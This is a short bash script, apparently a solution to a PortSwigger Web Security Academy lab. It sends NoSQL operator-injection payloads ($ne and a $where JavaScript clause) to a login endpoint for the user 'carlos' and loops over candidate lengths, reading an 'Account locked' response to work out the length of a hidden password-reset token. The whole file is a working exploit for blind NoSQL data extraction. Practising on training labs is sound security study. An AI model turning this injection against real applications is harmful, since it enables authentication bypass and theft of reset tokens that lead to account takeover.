#!/bin/bash

echo "Checking token length..."
for len in {1..50}; do
  result=$(curl -s -X POST "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/login" \
    -H "Cookie: session=CInUWYnpHEMIbjBVttgAfw3X7oTxjSRc" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"invalid\"},\"\$where\":\"this.resetPwdToken && this.resetPwdToken.length == $len\"}" \
    --compressed)

  if echo "$result" | grep -q "Account locked"; then
    echo "Found! Token length is: $len"
    break
  fi
done